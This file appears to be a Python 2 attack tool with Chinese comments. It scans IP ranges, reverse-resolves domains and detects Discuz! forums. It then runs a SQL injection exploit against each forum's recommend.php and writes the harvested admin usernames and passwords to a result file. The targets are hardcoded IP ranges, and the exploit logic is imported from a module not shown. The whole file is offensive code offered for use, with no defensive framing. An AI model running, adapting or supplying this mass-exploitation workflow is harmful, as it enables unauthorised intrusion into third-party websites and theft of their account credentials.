#coding=utf-8
import requests
import json
import urllib
import sys
import os
import socket
import time
import re
import threading
from bs4 import BeautifulSoup
from discuz_feature import matches
from util import Util
from ip_reverse import IPReverse
from scanner import Scanner
from discuz_detector import DiscuzDetector
from discuz_attacker import DiscuzAttacker

'''
工作类
负责调用模块完成业务逻辑
'''
class Worker(threading.Thread):
	def __init__(self,ip1,ip2):
		threading.Thread.__init__(self)
		self.startip = ip1
		self.endip = ip2

	def run(self):
		myscanner = Scanner()
		ipreverse = IPReverse()
		domain_list = []
		tmp_list = []
		discuz_res = []
		ip_list = myscanner.WebScanner(self.startip,self.endip) #获取IP列表
		for x in ip_list:
			tmp_list = ipreverse.getDomainsList(x)
			if tmp_list == None:
				continue
			domain_list = domain_list + tmp_list   #获取域名列表
		for x in domain_list:
			if not x:
				continue
			for i in x:
				print i
				discuzdetector = DiscuzDetector(i)
				if discuzdetector.get_result()[0]:
				    discuz_res.append(i)
				else:
					continue
		#攻击程序（可以自行添加）
		discuz_attacker = DiscuzAttackProcess()
		discuz_attacker.exploit(discuz_res)
		return ''


'''
Discuz攻击程序
使用漏洞为：
recommend.php
用户推荐功能sql注入
'''
class DiscuzAttackProcess():
	def __init__(self):
		self.discuz_attaker = DiscuzAttacker()
	def exploit(self,discuz_list):
		write_str = '\n--------------------------------------------------\n'
		write_file = open('result.txt','ab')
		for x in discuz_list:
			url = "http://%s" % x
			print '-'*60
			print 'Target host is %s' % x
			write_str += 'Target host is %s\n' % x
			res = self.discuz_attaker.faq_sqlin_exploit(x)
			if not res:
				print 'Exploit Failed!'
				write_str += 'Exploit Failed!\n'
			else:
				print 'Exploit success!'
				write_str += 'Exploit success!\n'
				print 'Username:%s\nPassword:%s' % (res[0],res[1])
				write_str += 'Username:%s\nPassword:%s\n' % (res[0],res[1])
			write_file.write(write_str)
		write_file.close()
		return ''

'''
实现的业务逻辑：
1、实现主机端口扫描（主要扫描80），获取开放80的主机列表（IP列表）
2、从IP列表中反查出绑定在每个item上的域名，获取域名列表
3、从域名列表中识别出使用dedecms的域名
4、开始漏洞攻击探测，识别出存在漏洞的主机
'''
if __name__ == '__main__':
	begin = time.time()
	discuz_res = []
	util = Util()
	iptool = Scanner()
	print 'Job starting....\nPlease wait....'
	#myworker = Worker('219.235.5.52','219.235.5.54')
	#myworker = Worker('121.14.59.91','121.14.59.91')
	iprange = iptool.iprange('218.66.104.103','218.66.104.255')
	for x in xrange(int(iprange[2])+1):
		myworker = Worker(iptool.num2ip(x),iptool.num2ip(x))
		myworker.start()
		myworker.join()
	if discuz_res == []:
		print u'No such web-app'
	else:
		print 'Find Discuz! The results are displayed below:'
		util.list_display(discuz_res)

	






	 
